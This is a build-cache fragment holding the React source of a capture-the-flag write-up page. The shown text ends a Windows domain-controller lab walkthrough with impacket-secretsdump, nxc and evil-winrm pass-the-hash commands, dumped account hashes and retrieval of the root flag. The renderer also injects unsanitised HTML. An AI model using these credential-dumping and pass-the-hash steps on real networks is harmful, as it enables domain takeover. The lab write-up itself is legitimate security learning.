LOCAL\n\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:209c...:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\\`\\`\\`\n![SYSVOL Startup Listing](/writeup-images/DC02_images/12.png)\n\nWe also can use the dc01 user account and make a pass the hash attack to dump all hashes from domain controler.\n\\`\\`\\`bash\nimpacket-secretsdump SOUPEDECODE.LOCAL/'dc01$'@192.168.0.18 -hashes :84204...\n\\`\\`\\`\n![Backup Script Content](/writeup-images/DC02_images/13.png)\n\nWe can see that the backup script contains credentials for the \\`dc01$\\` machine account. Let's use these credentials to dump the hashes.\n\n\\`\\`\\`bash\nimpacket-secretsdump SOUPEDECODE.LOCAL/'dc01$'@192.168.0.18 -hashes :84204...\n\\`\\`\\`\n\n![Domain Controller Hash Dump](/writeup-images/DC02_images/13.png)\n\nWe can authenticate as the Administrator making a pass the hash attack:\n\\`\\`\\`bash\nnxc winrm 192.168.0.18 -u Administrator -H 8982...\n\\`\\`\\`\n\n![Administrator Authentication](/writeup-images/DC02_images/14.png)\n\nAuthenticating as Administrator and retrieving the root flag.\n\\`\\`\\`bash\nevil-winrm -i 192.168.0.18 -u Administrator -H 8982...\n\\`\\`\\`\n\n![Root Flag Retrieval](/writeup-images/DC02_images/17.png)\n    `\n  };\n\n  return (\n    <motion.div \n      className=\"writeup-detail-page\"\n      initial={{ opacity: 0, y: 20 }}\n      animate={{ opacity: 1, y: 0 }}\n      transition={{ duration: 0.6 }}\n    >\n      <div className=\"writeup-header\">\n        <Link to=\"/writeups\" className=\"back-button\">\n          <FaArrowLeft />\n          <span>Back to Writeups</span>\n        </Link>\n        \n        <motion.div \n          className=\"writeup-title-section\"\n          initial={{ opacity: 0, y: 20 }}\n          animate={{ opacity: 1, y: 0 }}\n          transition={{ delay: 0.2, duration: 0.6 }}\n        >\n          <h1>{writeup.title}</h1>\n          \n          <div className=\"writeup-meta\">\n            <div className=\"meta-item\">\n              <FaCalendar />\n              <span>{writeup.date}</span>\n            </div>\n            <div className=\"meta-item\">\n              <FaTag />\n              <span>Difficulty: {writeup.difficulty}</span>\n            </div>\n          </div>\n\n          <div className=\"writeup-tags\">\n            {writeup.tags.map((tag, index) => (\n              <motion.span\n                key={tag}\n                className=\"tag-badge\"\n                initial={{ scale: 0, opacity: 0 }}\n                animate={{ scale: 1, opacity: 1 }}\n                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}\n                whileHover={{ scale: 1.1 }}\n              >\n                {tag}\n              </motion.span>\n            ))}\n          </div>\n          \n          <div className=\"machine-info\">\n            <div className=\"machine-info-content\">\n              <div className=\"machine-info-left\">\n                <h6><FaServer /> Machine Information:</h6>\n                <div className=\"machine-badges\">\n                  <span className=\"badge bg-primary\">\n                    <FaStar /> Difficulty: {writeup.difficulty}\n                  </span>\n                  <span className=\"badge bg-info\">\n                    <FaDesktop /> OS: {writeup.os}\n                  </span>\n                  <span className=\"badge bg-secondary\">\n                    <FaNetworkWired /> IP: {writeup.ip}\n                  </span>\n                </div>\n              </div>\n              <div className=\"machine-info-right\">\n                <img src=\"/writeup-images/dc02-machine.png\" alt=\"DC02 Machine\" className=\"machine-image\" />\n              </div>\n            </div>\n          </div>\n        </motion.div>\n      </div>\n\n      <div className=\"writeup-layout\">\n        <motion.div \n          className=\"writeup-content\"\n          initial={{ opacity: 0, y: 20 }}\n          animate={{ opacity: 1, y: 0 }}\n          transition={{ delay: 0.4, duration: 0.6 }}\n        >\n          <div className=\"markdown-content\">\n            {(() => {\n              const lines = writeup.content.split('\\n');\n              const elements = [];\n              let i = 0;\n              \n              while (i < lines.length) {\n                const line = lines[i];\n                \n                if (line.startsWith('# ')) {\n                  elements.push(<h1 key={i}>{line.substring(2)}</h1>);\n                } else if (line.startsWith('## ')) {\n                  elements.push(<h2 key={i}>{line.substring(3)}</h2>);\n                } else if (line.startsWith('### ')) {\n                  elements.push(<h3 key={i}>{line.substring(4)}</h3>);\n                } else if (line.startsWith('```')) {\n                  // Handle code blocks\n                  const language = line.substring(3).trim();\n                  const codeLines = [];\n                  i++;\n                  \n                  while (i < lines.length && !lines[i].startsWith('```')) {\n                    codeLines.push(lines[i]);\n                    i++;\n                  }\n                  \n                  elements.push(\n                    <pre key={i} className=\"code-block\">\n                      <code className={`language-${language}`}>\n                        {codeLines.join('\\n')}\n                      </code>\n                    </pre>\n                  );\n                } else if (line.startsWith('![') && line.includes('](') && line.endsWith(')')) {\n                  const altText = line.match(/\\[(.*?)\\]/)[1];\n                  const imageSrc = line.match(/\\((.*?)\\)/)[1];\n                  elements.push(\n                    <div key={i} className=\"image-container\">\n                      <img src={imageSrc} alt={altText} className=\"content-image\" />\n                    </div>\n                  );\n                } else if (line.trim() === '') {\n                  elements.push(<br key={i} />);\n                } else {\n                  // Process inline markdown\n                  const processedLine = line\n                    .replace(/\\*\\*(.*?)\\*\\*/g, '<strong>$1</strong>') // Bold\n                    .replace(/\\*(.*?)\\*/g, '<em>$1</em>') // Italic\n                    .replace(/`(.*?)`/g, '<code class=\"inline-code\">$1</code>'); // Inline code\n                  \n                  elements.push(\n                    <p key={i} dangerouslySetInnerHTML={{ __html: processedLine }} />\n                  );\n                }\n                \n                i++;\n              }\n              \n              return elements;\n            })()}\n          </div>\n        </motion.div>\n        <TableOfContents content={writeup.content} />\n      </div>\n    </motion.div>\n  );\n};\n\nexport default DC02Walkthrough;\n"],"mappings":";AAAA,OAAOA,KAAK,MAAM,OAAO;AACzB,SAASC,IAAI,QAAQ,kBAAkB;AACvC,SAASC,MAAM,QAAQ,eAAe;AACtC,SAASC,WAAW,EAAEC,UAAU,EAAEC,KAAK,EAAEC,QAAQ,EAAEC,MAAM,EAAEC,SAAS,EAAEC,cAAc,QAAQ,gBAAgB;AAC5G,OAAOC,eAAe,MAAM,qCAAqC;AACjE,OAAO,uBAAuB;AAAC,SAAAC,MAAA,IAAAC,OAAA;AAE/B,MAAMC,eAAe,GAAGA,CAAA,KAAM;EAC5B;EACA,MAAMC,OAAO,GAAG;IACdC,EAAE,EAAE,kBAAkB;IACtBC,KAAK,EAAE,kBAAkB;IACzBC,IAAI,EAAE,cAAc;IACpBC,IAAI,EAAE,CAAC,KAAK,EAAE,SAAS,EAAE,IAAI,EAAE,YAAY,EAAE,QAAQ,EAAE,kBAAkB,EAAE,mBAAmB,EAAE,KAAK,EAAE,MAAM,CAAC;IAC9GC,UAAU,EAAE,QAAQ;IACpBC,EAAE,EAAE,SAAS;IACbC,EAAE,EAAE,cAAc;IAClBC,OAAO,EAAE;AACb;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;A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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}